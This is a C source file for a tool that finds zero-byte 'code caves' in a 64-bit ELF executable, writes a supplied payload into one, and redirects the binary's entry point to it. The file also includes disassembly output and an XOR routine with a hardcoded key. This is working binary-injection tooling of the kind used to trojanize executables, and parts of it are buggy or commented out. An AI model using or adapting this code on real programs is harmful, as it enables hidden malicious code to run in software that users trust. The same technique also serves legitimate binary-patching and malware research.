//
#include <elf.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>

#include <capstone/capstone.h>

#include <keystone/keystone.h>

//
#define CC_SIZE 100

//
#define KEY_LEN 16

//
#define MAX_CODE_CAVES 128

//
#define DEFAULT_EP ((char *)0x0000000000400000)

//
typedef struct code_cave_section_s {

  //
  unsigned section_code_cave_index;
  
  //
  Elf64_Shdr *section_header;

  //
  char *section_name;
  
} code_cave_section_t;

//SoA vs AoS
typedef struct code_cave_tab_s {

  //
  char    *code_cave_ptr[MAX_CODE_CAVES];
  unsigned code_cave_ptr_off[MAX_CODE_CAVES];
  unsigned code_cave_len[MAX_CODE_CAVES];
  
  //
  unsigned nb_code_caves;
  
  //
  unsigned code_cave_total_size;
  
} code_cave_tab_t;

//
typedef struct payload_s {
  
  //
  char *payload_ptr;
  unsigned payload_len;
  
  //
  char *payload_data_section;
  unsigned payload_data_section_len;

  //
  char *payload_code_section;
  unsigned payload_code_section_len;
  
} payload_t;

//
typedef struct binary_s {

  //
  unsigned binary_len;

  //
  char *binary_ptr;

  //
  unsigned long long binary_entry_point;

  //
  unsigned long long binary_new_entry_point;
  
  //
  unsigned char *binary_default_entry_point;
  
  //
  code_cave_tab_t *binary_cc_tab;

  //
  code_cave_tab_t *binary_cc_tab_targets;

  //
  code_cave_section_t *binary_code_cave_target_section;
  
  //
  payload_t *binary_payload;

} binary_t;
  
//
char key[] = "ThisIsNotASecKey";

//
void xor(char *p, unsigned len)
{
  for (unsigned i = 0; i < len; i++)
    p[i] ^= key[i & (KEY_LEN - 1)];
}

//
payload_t *load_payload(char *f)
{
  FILE *fp = fopen(f, "rb");

  //
  if (fp)
    {
      //Get file size
      struct stat sb;
      
      stat(f, &sb);
      
      //
      payload_t *p = malloc(sizeof(payload_t));
      
      //
      p->payload_len = sb.st_size;
      
      //
      p->payload_ptr = malloc(sizeof(char) * sb.st_size); 
      
      fread(p->payload_ptr, sizeof(char), sb.st_size, fp);

      //
      fclose(fp);
      
      //
      return p;
    }
  else
    return NULL;
}

//
void print_payload(payload_t *p)
{
  //
  printf("Code size: %u\n", p->payload_len);

  //
  for (unsigned i = 0; i < p->payload_len; i++)
    printf("0x%02x%c", (unsigned char)p->payload_ptr[i], ((i + 1) & 15) ? ' ' : '\n');

  printf("\n\n");
}

//
void disas(char *p, unsigned len, unsigned ep_address)
{
  csh handle;
  cs_insn *insn;
  size_t count;
  
  //
  if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK)
    printf("Error in payload disassembly!\n");
  else
    {
      //
      count = cs_disasm(handle, p, len, ep_address, 0, &insn);
      
      //
      if (count > 0)
	{
	  //
	  for (size_t j = 0; j < count; j++)
	    {
	      printf("0x%"PRIx64":\t", insn[j].address);

	      //Print bytes
	      for (unsigned short i = 0; i < insn[j].size; i++)
		printf("%02x ", insn[j].bytes[i]);

	      for (unsigned short i = insn[j].size; i < 16; i++)
		printf("   ");
	      
	      printf("%s\t\t%s\n",
		     insn[j].mnemonic,
		     insn[j].op_str);
	    }
	  
	  cs_free(insn, count);
	}
      else
	printf("Failed to disassemble payload!\n");
      
      //
      cs_close(&handle);

      printf("\n");
    }
}

//
void release_payload(payload_t **p)
{
  if (*p)
    {
      if ((*p)->payload_ptr)
	free((*p)->payload_ptr);
      
      free(*p);
    }
}

//
void inject_payload(binary_t *b)
{
  //
  unsigned code_cave_index = b->binary_code_cave_target_section->section_code_cave_index; //randxy(0, b->binary_cc_tab->nb_code_caves)
  
  //
  unsigned code_cave_ptr_off = b->binary_cc_tab_targets->code_cave_ptr_off[code_cave_index];
  
  //Apply 16bytes alignment
  code_cave_ptr_off = ((code_cave_ptr_off & 0xFFFFFFF0) + 0x00000010);
  
  //
  unsigned char *p = b->binary_ptr + code_cave_ptr_off;
  
  //
  unsigned payload_len = b->binary_payload->payload_len;
  
  //Inject payload code
  for (unsigned i = 0; i < payload_len; i++)
    p[i] = b->binary_payload->payload_ptr[i];
  
  //JMP CODE_CAVE_ADDRESS (make sure to reach entry point after payload execution)
  //48 b8 35 08 40 00 00 00 00 00 (mov rax, 0x0000000000400835)
  //ff e0                         (jmp rax)
  
  //mov rax, addr
  /* p[payload_len]     = 0x48; */
  /* p[payload_len + 1] = 0xB8; */
  /* p[payload_len + 2] = (b->binary_entry_point & 0x00000000000000FF); */
  /* p[payload_len + 3] = (b->binary_entry_point & 0x000000000000FF00) >>  8; */
  /* p[payload_len + 4] = (b->binary_entry_point & 0x0000000000FF0000) >> 16; */
  /* p[payload_len + 5] = (b->binary_entry_point & 0x00000000FF000000) >> 24; */
  /* p[payload_len + 6] = 0x00; */
  /* p[payload_len + 7] = 0x00; */
  /* p[payload_len + 8] = 0x00; */
  /* p[payload_len + 9] = 0x00; */
  
  /* //jmp rax */
  /* p[payload_len + 10] = 0xFF; */
  /* p[payload_len + 11] = 0xE0; */
  /* p[payload_len + 12] = 0x00; */
  
  //Real entry point address
  printf("# Target code cave address, offset: 0x%08x, 0x%08x\n\n", DEFAULT_EP + code_cave_ptr_off, code_cave_ptr_off);
  
  //Change entry point to code cave address
  *(unsigned *)(b->binary_ptr + 24) = DEFAULT_EP + code_cave_ptr_off;

  //
  b->binary_new_entry_point = DEFAULT_EP + code_cave_ptr_off;
}

//
code_cave_tab_t *filter_code_caves(code_cave_tab_t *ct, unsigned len)
{
  //
  unsigned nb_code_caves = 0;
  code_cave_tab_t *new_ct = malloc(sizeof(code_cave_tab_t));

  //
  new_ct->nb_code_caves = 0;
  
  //
  for (unsigned i = 0; i < ct->nb_code_caves; i++)
    {
      //12 bytes for (mov & jmp)
      if (ct->code_cave_len[i] > (len + (len & 15) + 12))
	{
	  new_ct->code_cave_ptr[nb_code_caves]     = ct->code_cave_ptr[i];
	  new_ct->code_cave_len[nb_code_caves]     = ct->code_cave_len[i];
	  new_ct->code_cave_ptr_off[nb_code_caves] = ct->code_cave_ptr_off[i];

	  //
	  new_ct->code_cave_total_size += ct->code_cave_len[i];

	  //
	  nb_code_caves++;
	}
    }

  //
  new_ct->nb_code_caves = nb_code_caves;

  //
  return new_ct;
}

//Find code caves
code_cave_tab_t *find_code_caves(char *p, unsigned len, unsigned code_cave_size)
{
  unsigned char done = 0;
  //
  code_cave_tab_t *t = malloc(sizeof(code_cave_tab_t));

  //
  unsigned nb_code_caves = 0;
  unsigned code_cave_total_size = 0;
  
  //
  for (unsigned i = 0; !done && i < len; i++)
    {      
      //
      if (p[i] == 0)
	{
	  unsigned j = 0;

	  //Roll over if zeroes
	  while (p[i + j] == 0)
	    j++;

	  if (j >= code_cave_size)
	    {
	      if (nb_code_caves < MAX_CODE_CAVES)
		{
		  //
		  t->code_cave_ptr[nb_code_caves]     = p + i;
		  t->code_cave_ptr_off[nb_code_caves] = i;
		  t->code_cave_len[nb_code_caves]     = j;
		  
		  //
		  code_cave_total_size += j;
		  
		  nb_code_caves++;
		}
	      else
		done = 1;
	    }

	  i += j;
	}
    }
  
  //
  t->nb_code_caves = nb_code_caves;
  t->code_cave_total_size = code_cave_total_size;

  return t;
}

//
code_cave_section_t *find_code_cave_section(char *p, unsigned code_cave_ptr)
{
  //
  char *sname             = NULL;
  Elf64_Ehdr *elf_hdr     = (Elf64_Ehdr *)p;
  Elf64_Shdr *shdr        = (Elf64_Shdr *)(p + elf_hdr->e_shoff);
  Elf64_Shdr *sh_strtab   = &shdr[elf_hdr->e_shstrndx];
  const char *sh_strtab_p = p + sh_strtab->sh_offset;
  
  //Go through section header entries
  for (int i = 0; i < elf_hdr->e_shnum; i++)
    {
      Elf64_Addr sh_addr         = shdr[i].sh_addr;
      unsigned long long sh_size = shdr[i].sh_size;

      //
      sname = (char *)(sh_strtab_p + shdr[i].sh_name);
      
      //if code cave address is in within section's address range
      if (code_cave_ptr >= sh_addr && code_cave_ptr <= sh_addr + sh_size)
	{
	  code_cave_section_t *ccs = malloc(sizeof(code_cave_section_t));

	  //
	  ccs->section_name = sname;
	  ccs->section_header = &shdr[i];
	  
	  //
	  return ccs;
	}
    }
  
  //
  return NULL;
}

//
void print_code_caves(code_cave_tab_t *t)
{  
  //
  for (unsigned i = 0; i < t->nb_code_caves; i++)
    {
      printf("[CC #%u ] %p 0x%08x %u\n", i, t->code_cave_ptr[i], t->code_cave_ptr_off[i], t->code_cave_len[i]);      
    }

  //
  printf("\n#Total available cave size: %u Bytes\n\n", t->code_cave_total_size);
}

//
void release_code_caves(code_cave_tab_t *ct)
{
  //
  if (ct)
    free(ct);
}

//
Elf64_Shdr *find_section(char *p, char *name)
{
  //
  char       *sname       = NULL;
  Elf64_Ehdr *elf_hdr     = (Elf64_Ehdr *)p;
  Elf64_Shdr *shdr        = (Elf64_Shdr *)(p + elf_hdr->e_shoff);
  Elf64_Shdr *sh_strtab   = &shdr[elf_hdr->e_shstrndx];
  const char *sh_strtab_p = p + sh_strtab->sh_offset;
  
  //Go through section header entries
  for (int i = 0; i < elf_hdr->e_shnum; i++)
    {
      //Get section name
      sname = (char *)(sh_strtab_p + shdr[i].sh_name);
      
      //Check section name
      if (!strcmp (sname, name))
	return &shdr[i];
    }
  
  //
  return NULL;
}

//
int encrypt_section(char *p, unsigned len)
{
  //
  int fd;
  Elf64_Shdr *s = NULL;
  
  //Find target section
  if ((s = find_section(p, ".v_s")) == NULL)
    {
      fprintf(stderr, "? No secure section found...\n");
      
      close(fd);
      exit(1);
    }
  
  //Encrypt the section
  //_x_(p + s->sh_offset, s->sh_size);
  
  //Store Offset and size
  *((int *)  (p + 0x09)) = s->sh_offset;
  *((short *)(p + 0x0d)) = s->sh_size;
}

//
binary_t *load_binary(char *bf, char *pf)
{
  int fd, len;
  char *p = NULL;
  
  //
  if ((fd = open(bf, O_RDWR, 0)) < 0)
    printf("Error: open\n"), exit(1);

  //
  struct stat sb;
  
  stat(bf, &sb);
  
  len = sb.st_size;
  
  //Map file descriptor into memory
  if ((p = mmap(0, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED)
    printf("Error: mmap\n"), exit(1);

  //Allocate a binary 
  binary_t *b = malloc(sizeof(binary_t));

  //Assign values to struct fields
  b->binary_len = len;
  b->binary_ptr = p;

  //read entry point raw style
  b->binary_entry_point =  *((unsigned long long *)(p + 24));
  
  //Set default target entry point
  b->binary_default_entry_point = DEFAULT_EP;
  
  //Find code caves
  b->binary_cc_tab = find_code_caves(p, len, CC_SIZE); 

  //Load the payload
  b->binary_payload = load_payload(pf);
  
  //Filter code caves
  b->binary_cc_tab_targets = filter_code_caves(b->binary_cc_tab, b->binary_payload->payload_len);   

  //
  int i = 1;
  code_cave_section_t *ccts = NULL;
  
  /* //Find code cave sections */
  /* for (unsigned i = 0; !ccts && i < b->binary_cc_tab_targets->nb_code_caves; i++) */
  /*   { */
      
      ccts = find_code_cave_section(b->binary_ptr, (unsigned)DEFAULT_EP + b->binary_cc_tab_targets->code_cave_ptr_off[i]);

      //
      if (ccts)
	ccts->section_code_cave_index = i;
      
      //
      printf("# Code cave %u (@: 0x%08x, Size: %u) found in section '%s' @: 0x%016x\n", i,
	     (unsigned)DEFAULT_EP + b->binary_cc_tab_targets->code_cave_ptr_off[i],
	     b->binary_cc_tab_targets->code_cave_len[i],
	     ((ccts) ? ccts->section_name : "None"),
	     ((ccts) ? ccts->section_header->sh_addr : 0));
    /* } */
  
  printf("\n");
  
  //
  b->binary_code_cave_target_section = ccts;
  
  //
  close(fd);

  //
  return b;
}

//
void release_binary(binary_t **b)
{
  //
  if (*b)
    {
      release_code_caves((*b)->binary_cc_tab);
      release_code_caves((*b)->binary_cc_tab_targets);

      release_payload(&(*b)->binary_payload);

      free(*b);
    }
}


//
int main(int argc, char **argv)
{
  //
  if (argc < 3)
    return printf("Usage: %s [binary file] [payload]\n", argv[0]), 2;
  
  //
  binary_t *b = load_binary(argv[1], argv[2]);

  //
  printf("# Entry point: 0x%08x\n", b->binary_entry_point);
  
  //
  printf("\n# Code caves:\n");
  print_code_caves(b->binary_cc_tab);

  //
  printf("# Target code caves:\n");
  print_code_caves(b->binary_cc_tab_targets);

  //
  printf("# Payload bytes:\n");
  print_payload(b->binary_payload);

  //
  inject_payload(b);

  //Print payload disassembly
  printf("# Payload disassembly:\n");
  disas(b->binary_payload->payload_ptr, b->binary_payload->payload_len, b->binary_new_entry_point);

  //
  release_binary(&b);
  
  return 0;
}
